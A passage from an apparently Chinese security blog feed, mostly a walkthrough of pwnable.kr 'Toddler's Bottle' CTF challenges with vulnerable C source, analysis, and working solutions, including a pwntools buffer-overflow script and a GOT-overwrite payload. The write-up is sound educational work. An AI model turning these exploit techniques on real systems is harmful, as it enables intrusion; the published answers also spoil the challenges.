class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryInterval</span><span class="token punctuation">(</span><span class="token keyword">long</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRemoteAddressSelector</span><span class="token punctuation">(</span>RemoteAddressSelector remoteAddressSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> RemoteAddressSelector <span class="token function">getRemoteAddressSelector</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/mov.gif" alt="mov"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://nosec.org/home/detail/4472.html" target="_blank" rel="noopener">【安全通报】用友NC反序列化远程命令执行漏洞</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;欠了很久，简单分析下~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr 之 Toddler&#39;s Bottle</title>
    <link href="https://blog.sari3l.com/posts/d4fb29f2/"/>
    <id>https://blog.sari3l.com/posts/d4fb29f2/</id>
    <published>2020-06-14T14:54:02.000Z</published>
    <updated>2020-07-06T09:45:14.050Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li><p>关于反汇编时函数显示 plt </p><ul><li>原因：<a href="https://www.binss.me/blog/plt-and-got/" target="_blank" rel="noopener">PLT与GOT</a></li><li>解决方案：<a href="https://reverseengineering.stackexchange.com/questions/19895/radares-aaaa-and-aa-what-does-it-do-exactly" target="_blank" rel="noopener">Radare’s <code>aaaa</code> and -AA what does it do, exactly?</a></li></ul></li><li><p>注意 pwndbg 对 heap 命令进行过一次大改，最后一次还易使用 commit 为 fbd2bb3abfc2500aae76d159e23015008e879b8d<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15915160149123.jpg" alt="-w878"></p></li></ol><h2 id="1-fd"><a href="#1-fd" class="headerlink" title="1. [fd]"></a>1. [fd]</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c">fd@pwnable<span class="token punctuation">:</span><span class="token operator">~</span>$ cat fd<span class="token punctuation">.</span>c<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们首先注意到 read 函数语法，暂时没找到</p><p>由于 fd 为传入可控，当我们将 fd=0x0时，即 fd=stdin 时，我们就可以控制 buf 内的内容，从而通过判断获取 flag</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">fd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!</code></pre><h2 id="2-collision"><a href="#2-collision" class="headerlink" title="2. collision"></a>2. collision</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> hashcode <span class="token operator">=</span> <span class="token number">0x21DD09EC</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token operator">*</span> ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        res <span class="token operator">+</span><span class="token operator">=</span> ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : %s [passcode]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"passcode length should be 20 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hashcode <span class="token operator">==</span> <span class="token function">check_password</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong passcode.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ol><li>限制传入值为 20 字节</li><li>将传入的内容分为 5 个 int 值</li><li>sum 之和需为 hashcode</li></ol><p>0x21DD09EC == 568134124 == 113626824*4 + 113626828</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `echo -e "\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p>或者</p><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `printf "\xc8\xce\xc5\x06%0.s" {1..4} && printf "\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p><a href="https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times" target="_blank" rel="noopener">https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times</a></p><h2 id="3-bof"><a href="#3-bof" class="headerlink" title="3. bof"></a>3. bof</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// smash me!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>在 Ninja 中，可以方便看到逻辑判断</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907181567512.jpg" alt="-w815"></p><p>我们来看下C语言函数调用栈的典型内存布局</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907189598255.jpg" alt></p><p>因为存储变量时是从低地址开始覆盖的，所以从 ebp-0x2c 到 ebp+0x8，我们需要覆盖长度 0x34 的数据，然后覆盖变量值为0xcafebabe</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4. flag"></a>4. flag</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><pre class=" language-plain"><code class="language-plain">Papa brought me a packed present! let's open it.Download : http://pwnable.kr/bin/flagThis is reversing task. all you need is binary</code></pre><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>首先拿到题目，直接拖进 Ninja 可以发觉是加了壳的，简单识别下可以看到是 upx 壳</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907233766982.jpg" alt="-w411"></p><p>利用<code>upx -d</code>脱壳</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ '/home/pwn/tools/upx-3.96-amd64_linux/upx' -d flag                        Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2020UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    883745 <-    335288   37.94%   linux/amd64   flagUnpacked 1 file.</code></pre><p>查看下 main 函数，注意到字符串存储的位置</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907236039631.jpg" alt="-w452"></p><p>点进去看下，可以看到上面的那串应该就是 flag 了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907235836712.jpg" alt="-w994"></p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ strings flag | grep ':)'UPX...? sounds like a delivery service :)</code></pre><h2 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5. passcode"></a>5. passcode</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> passcode1<span class="token punctuation">;</span>    <span class="token keyword">int</span> passcode2<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode1 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode2 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checking...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>passcode1<span class="token operator">==</span><span class="token number">338150</span> <span class="token operator">&amp;&amp;</span> passcode2<span class="token operator">==</span><span class="token number">13371337</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login OK!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login Failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter you name : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%100s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome %s!\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Toddler's Secure Login System 1.0 beta.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// something after login...</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now I can safely trust you that you have credential :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>利用 scp 把题目拷下来</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/tools/die_lin64_portable$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode ./passcode@pwnable.kr's password: passcode                                          100% 7485     7.3KB/s   00:01</code></pre><p>再来检测下程序开启了哪些保护措施，注意到 PIE 没有开启</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ checksec passcode [*] '/home/pwn/桌面/passcode'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>回到代码，注意到<code>scanf(&quot;%d&quot;, passcode1);</code>这段代码是有问题的，首先考虑直接溢出覆盖passcode1 以及 passcode2，338150 == 0x000528e6已经出现了0x00截断，因此无法实现变量覆盖</p><p>那么直接覆盖RET呢？注意到开启了 Canary，需要绕过，暂时不会:(</p><p>但是注意到 PIE 没有开启，而且passcode1前面没有取地址符号<code>&amp;</code>，我们可以覆盖内存地址为passcode1的数据内容</p><p>这样我们通过将 passcode1 设置为 fflush 的 GOT 表单，通过 scanf 将调用地址指向 <code>system(&quot;/bin/cat flag&quot;);</code> 达成绕过认证获取 flag，大致步骤如下：</p><ol><li><p>从 name 到 passcode1 的长度为 (ebp+0x70) - (ebp-0x10) = 0x80 == 96</p></li><li><p>看一下 fflush 的 GOT 地址为0x0804a004</p><pre class=" language-shell"><code class="language-shell"> pwn@pwn-Parallels-Virtual-Platform:~/桌面$ objdump -R passcode  passcode：     文件格式 elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET   TYPE              VALUE  08049ff0 R_386_GLOB_DAT    __gmon_start__ 0804a02c R_386_COPY        stdin@@GLIBC_2.0 0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0 0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0 0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4 0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0 0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0 0804a014 R_386_JUMP_SLOT   __gmon_start__ 0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0 0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0 0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</code></pre></li><li><p>再通过 gdb 查看 <code>system(&quot;/bin/cat flag&quot;);</code> 开始调用的指令地址为 0x080485e3，同时注意到scanf 传参时为<code>%d</code>，所以需要转换成 int 型数据</p><pre class=" language-armasm"><code class="language-armasm"> (gdb) disassemble login Dump of assembler code for function login:    0x08048564 <+0>:     push   %ebp    0x08048565 <+1>:     mov    %esp,%ebp    0x08048567 <+3>:     sub    $0x28,%esp    0x0804856a <+6>:     mov    $0x8048770,%eax    0x0804856f <+11>:    mov    %eax,(%esp)    0x08048572 <+14>:    call   0x8048420 <printf@plt>    0x08048577 <+19>:    mov    $0x8048783,%eax    0x0804857c <+24>:    mov    -0x10(%ebp),%edx    0x0804857f <+27>:    mov    %edx,0x4(%esp)    0x08048583 <+31>:    mov    %eax,(%esp)    0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>    0x0804858b <+39>:    mov    0x804a02c,%eax    0x08048590 <+44>:    mov    %eax,(%esp)    0x08048593 <+47>:    call   0x8048430 <fflush@plt>    0x08048598 <+52>:    mov    $0x8048786,%eax    0x0804859d <+57>:    mov    %eax,(%esp)    .    .    .    0x080485d7 <+115>:   movl   $0x80487a5,(%esp)    0x080485de <+122>:   call   0x8048450 <puts@plt>    0x080485e3 <+127>:   movl   $0x80487af,(%esp)    0x080485ea <+134>:   call   0x8048460 <system@plt>    0x080485ef <+139>:   leave      0x080485f0 <+140>:   ret        0x080485f1 <+141>:   movl   $0x80487bd,(%esp)    0x080485f8 <+148>:   call   0x8048450 <puts@plt>    0x080485fd <+153>:   movl   $0x0,(%esp)    0x08048604 <+160>:   call   0x8048480 <exit@plt> End of assembler dump.</code></pre></li></ol><h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">passcode@pwnable:~$ python -c "print 'A' * 96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcodeToddler's Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :)</code></pre><h2 id="6-random"><a href="#6-random" class="headerlink" title="6. random"></a>6. random</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> random<span class="token punctuation">;</span>    random <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// random value!</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>key <span class="token operator">^</span> random<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xdeadbeef</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong, maybe you should try 2^32 cases.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>因为直接 random 为伪随机，我们只需要知道程序中生成的值是多少就可以直接拿来利用了</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> disassemble mainDump of assembler code for function main:   0x00000000004005f4 <+0>:   push   rbp   0x00000000004005f5 <+1>:   mov    rbp,rsp   0x00000000004005f8 <+4>:   sub    rsp,0x10   0x00000000004005fc <+8>:   mov    eax,0x0   0x0000000000400601 <+13>:  call   0x400500 <rand@plt>   0x0000000000400606 <+18>:  mov    DWORD PTR [rbp-0x4],eax   0x0000000000400609 <+21>:  mov    DWORD PTR [rbp-0x8],0x0   0x0000000000400610 <+28>:  mov    eax,0x400760   0x0000000000400615 <+33>:  lea    rdx,[rbp-0x8]   0x0000000000400619 <+37>:  mov    rsi,rdx   0x000000000040061c <+40>:  mov    rdi,rax   0x000000000040061f <+43>:  mov    eax,0x0   0x0000000000400624 <+48>:  call   0x4004f0 <__isoc99_scanf@plt>   0x0000000000400629 <+53>:  mov    eax,DWORD PTR [rbp-0x8]   0x000000000040062c <+56>:  xor    eax,DWORD PTR [rbp-0x4]   0x000000000040062f <+59>:  cmp    eax,0xdeadbeef   0x0000000000400634 <+64>:  jne    0x400656 <main+98>   0x0000000000400636 <+66>:  mov    edi,0x400763   0x000000000040063b <+71>:  call   0x4004c0 <puts@plt>   0x0000000000400640 <+76>:  mov    edi,0x400769   0x0000000000400645 <+81>:  mov    eax,0x0   0x000000000040064a <+86>:  call   0x4004d0 <system@plt>   0x000000000040064f <+91>:  mov    eax,0x0   0x0000000000400654 <+96>:  jmp    0x400665 <main+113>   0x0000000000400656 <+98>:  mov    edi,0x400778   0x000000000040065b <+103>: call   0x4004c0 <puts@plt>   0x0000000000400660 <+108>: mov    eax,0x0   0x0000000000400665 <+113>: leave     0x0000000000400666 <+114>: ret    End of assembler dump.</code></pre><p>可以确认 random 存在 rbp-0x4，输入值存在 rbp-0x8</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15909964922295.jpg" alt></p><p>注意小端存储，所以 random=0x6b8b4567</p><p>输入值：0x6b8b4567 ^ 0xdeadbeef = 3039230856</p><h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">random@pwnable:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable...</code></pre><h2 id="7-input"><a href="#7-input" class="headerlink" title="7. input"></a>7. input</h2><h3 id="题目-6"><a 